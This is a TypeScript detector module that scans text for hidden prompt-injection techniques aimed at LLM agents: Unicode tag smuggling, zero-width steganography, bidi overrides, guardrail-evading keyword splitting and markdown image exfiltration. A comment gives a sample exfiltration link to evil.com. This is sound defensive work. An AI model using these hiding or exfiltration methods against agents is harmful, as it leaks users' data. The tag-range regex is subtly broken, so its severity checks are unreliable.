import type { DecodedPayload } from './types';

/**
 * Unicode Tag Characters (U+E0000 - U+E007F).
 * Tag space is U+E0020, Tag ASCII characters map 1:1 to visible ASCII via cp - 0xE0000.
 */
export function decodeTagCharacters(text: string): DecodedPayload[] {
  const payloads: DecodedPayload[] = [];
  const chars = Array.from(text);
  let currentRun: { start: number; end: number; cps: number[]; text: string } | null = null;

  for (let i = 0; i < chars.length; i++) {
    const cp = chars[i].codePointAt(0)!;
    if (cp >= 0xe0000 && cp <= 0xe007f) {
      if (!currentRun) {
        currentRun = { start: i, end: i, cps: [cp], text: chars[i] };
      } else {
        currentRun.end = i;
        currentRun.cps.push(cp);
        currentRun.text += chars[i];
      }
    } else {
      if (currentRun) {
        payloads.push(createTagPayload(currentRun, text));
        currentRun = null;
      }
    }
  }

  if (currentRun) {
    payloads.push(createTagPayload(currentRun, text));
  }

  return payloads;
}

function createTagPayload(
  run: { start: number; end: number; cps: number[]; text: string },
  _fullText: string
): DecodedPayload {
  let decoded = '';
  for (const cp of run.cps) {
    const mapped = cp - 0xe0000;
    if (mapped >= 0x20 && mapped <= 0x7e) {
      decoded += String.fromCharCode(mapped);
    } else if (mapped === 0x0a) {
      decoded += '\n';
    } else if (mapped === 0x09) {
      decoded += '\t';
    } else {
      decoded += `\\u{${cp.toString(16)}}`;
    }
  }

  return {
    id: `tag-${run.start}-${run.end}`,
    vector: 'ascii-smuggling-tags',
    title: 'ASCII Smuggling via Unicode Tag Characters',
    rawSnippet: run.text,
    decodedText: decoded.trim(),
    startIndex: run.start,
    endIndex: run.end,
    byteOffset: run.start,
    severity: decoded.length > 5 ? 'CRITICAL' : 'HIGH',
    description: `Decoded ${run.cps.length} hidden high-plane Unicode tag characters into active ASCII text: "${decoded.trim()}".`,
  };
}

/**
 * Zero-width space (U+200B = 0) and Zero-width non-joiner (U+200C = 1) binary decoding.
 * Also checks for base-4 encoding with ZWJ (U+200D) and BOM (U+FEFF).
 */
export function decodeZeroWidthStego(text: string): DecodedPayload[] {
  const payloads: DecodedPayload[] = [];
  const chars = Array.from(text);
  const zwsSet = new Set([0x200b, 0x200c, 0x200d, 0xfeff, 0x2060]);

  let currentRun: { start: number; end: number; cps: number[]; text: string } | null = null;

  for (let i = 0; i < chars.length; i++) {
    const cp = chars[i].codePointAt(0)!;
    if (zwsSet.has(cp)) {
      if (!currentRun) {
        currentRun = { start: i, end: i, cps: [cp], text: chars[i] };
      } else {
        currentRun.end = i;
        currentRun.cps.push(cp);
        currentRun.text += chars[i];
      }
    } else {
      if (currentRun) {
        if (currentRun.cps.length >= 8) {
          const payload = tryDecodeZwsStream(currentRun);
          if (payload) payloads.push(payload);
        }
        currentRun = null;
      }
    }
  }

  if (currentRun && currentRun.cps.length >= 8) {
    const payload = tryDecodeZwsStream(currentRun);
    if (payload) payloads.push(payload);
  }

  return payloads;
}

function tryDecodeZwsStream(run: {
  start: number;
  end: number;
  cps: number[];
  text: string;
}): DecodedPayload | null {
  // Method 1: Binary (200B = 0, 200C = 1 or 200C = 0, 200B = 1)
  const bitString1 = run.cps
    .map(cp => (cp === 0x200b ? '0' : cp === 0x200c ? '1' : ''))
    .join('');
  const bitString2 = run.cps
    .map(cp => (cp === 0x200c ? '0' : cp === 0x200b ? '1' : ''))
    .join('');

  let decoded = decodeBitStringToAscii(bitString1);
  let usedBitString = bitString1;

  if (!isPrintableAscii(decoded)) {
    const candidate2 = decodeBitStringToAscii(bitString2);
    if (isPrintableAscii(candidate2)) {
      decoded = candidate2;
      usedBitString = bitString2;
    }
  }

  const isDecodedAscii = isPrintableAscii(decoded) && decoded.trim().length > 0;

  return {
    id: `zws-${run.start}-${run.end}`,
    vector: 'zero-width-stego',
    title: 'Zero-Width Steganographic Injection',
    rawSnippet: run.text,
    decodedText: isDecodedAscii ? decoded.trim() : `[Binary Stream: ${run.cps.length} bits]`,
    binaryRepresentation: usedBitString.slice(0, 64) + (usedBitString.length > 64 ? '…' : ''),
    startIndex: run.start,
    endIndex: run.end,
    byteOffset: run.start,
    severity: isDecodedAscii ? 'CRITICAL' : 'HIGH',
    description: isDecodedAscii
      ? `Extracted hidden binary payload decoded as ASCII: "${decoded.trim()}".`
      : `Detected concentrated run of ${run.cps.length} zero-width characters potential steganographic channel.`,
  };
}

function decodeBitStringToAscii(bits: string): string {
  let result = '';
  for (let i = 0; i + 8 <= bits.length; i += 8) {
    const byte = bits.slice(i, i + 8);
    const code = parseInt(byte, 2);
    if (!isNaN(code)) {
      result += String.fromCharCode(code);
    }
  }
  return result;
}

function isPrintableAscii(str: string): boolean {
  if (!str || str.length === 0) return false;
  let printable = 0;
  for (let i = 0; i < str.length; i++) {
    const code = str.charCodeAt(i);
    if ((code >= 32 && code <= 126) || code === 10 || code === 13 || code === 9) {
      printable++;
    }
  }
  return printable / str.length >= 0.75;
}

/**
 * Bidirectional Overrides (U+202E RLO, U+202D LRO, U+202A-202B).
 * Detects Trojan Source style visual ordering inversions.
 */
export function decodeBidiReversal(text: string): DecodedPayload[] {
  const payloads: DecodedPayload[] = [];
  const chars = Array.from(text);

  for (let i = 0; i < chars.length; i++) {
    const cp = chars[i].codePointAt(0)!;
    if (cp === 0x202e || cp === 0x202d || cp === 0x202a || cp === 0x202b) {
      const windowEnd = Math.min(chars.length, i + 60);
      const segment = chars.slice(i, windowEnd).join('');
      const visualReversed = Array.from(segment).reverse().join('');

      payloads.push({
        id: `bidi-${i}`,
        vector: 'bidi-override',
        title: 'Bidirectional Override (Trojan Source)',
        rawSnippet: segment,
        decodedText: `[Logical/Underlying Byte Order]: "${segment}" ↔ [Rendered Order]: "${visualReversed}"`,
        startIndex: i,
        endIndex: windowEnd,
        byteOffset: i,
        severity: 'HIGH',
        description: `Bidi control U+${cp.toString(16).toUpperCase()} forces visual rendering to invert or scramble instructions.`,
      });
    }
  }

  return payloads;
}

/**
 * Detects keywords split across soft hyphens (U+00AD) or zero-width joiners/spaces.
 */
export function detectKeywordSplitting(text: string): DecodedPayload[] {
  const payloads: DecodedPayload[] = [];
  // Match single words containing embedded formatting/zero-width characters
  const wordRegex = /[a-zA-Z\u00ad\u200b\u200c\u200d\u2060\ufeff]{4,}/g;

  let match: RegExpExecArray | null;
  while ((match = wordRegex.exec(text)) !== null) {
    const raw = match[0];
    if (/[\u00ad\u200b\u200c\u200d\u2060\ufeff]/.test(raw)) {
      const normalized = raw.replace(/[\u00ad\u200b\u200c\u200d\u2060\ufeff]/g, '');
      if (normalized.length >= 3 && normalized !== raw) {
        payloads.push({
          id: `split-${match.index}`,
          vector: 'soft-hyphen-evasion',
          title: 'Fragmented Keyword Filter Bypass',
          rawSnippet: raw,
          decodedText: normalized,
          startIndex: match.index,
          endIndex: match.index + raw.length,
          byteOffset: match.index,
          severity: 'MEDIUM',
          description: `Fragmented keyword "${raw}" bypasses keyword guardrails while tokenizing/recombining into "${normalized}".`,
        });
      }
    }
  }

  return payloads;
}

/**
 * Detects invisible or zero-width exfiltration markdown links (e.g. ![alt](https://evil.com/exfil?q=...))
 */
export function detectMarkdownExfil(text: string): DecodedPayload[] {
  const payloads: DecodedPayload[] = [];
  const imgRegex = /!\[([^\]]*)\]\((https?:\/\/[^\s)]+)\)/gi;

  let match: RegExpExecArray | null;
  while ((match = imgRegex.exec(text)) !== null) {
    const altText = match[1];
    const url = match[2];
    const hasInvisibleAlt = /[\u200b-\u200d\ufeff\ue0000-\ue007f]/.test(altText);
    const hasInvisibleUrl = /[\u200b-\u200d\ufeff\ue0000-\ue007f]/.test(url);

    if (hasInvisibleAlt || hasInvisibleUrl || url.includes('?') || url.includes('leak') || url.includes('exfil')) {
      payloads.push({
        id: `exfil-${match.index}`,
        vector: 'invisible-markdown-exfil',
        title: 'Potential Markdown Image Exfiltration Vector',
        rawSnippet: match[0],
        decodedText: `Target URL: ${url}`,
        startIndex: match.index,
        endIndex: match.index + match[0].length,
        byteOffset: match.index,
        severity: (hasInvisibleAlt || hasInvisibleUrl) ? 'CRITICAL' : 'HIGH',
        description: `Markdown image or link element capable of triggering automatic URL fetching / data exfiltration in rendering LLM agents.`,
      });
    }
  }

  return payloads;
}
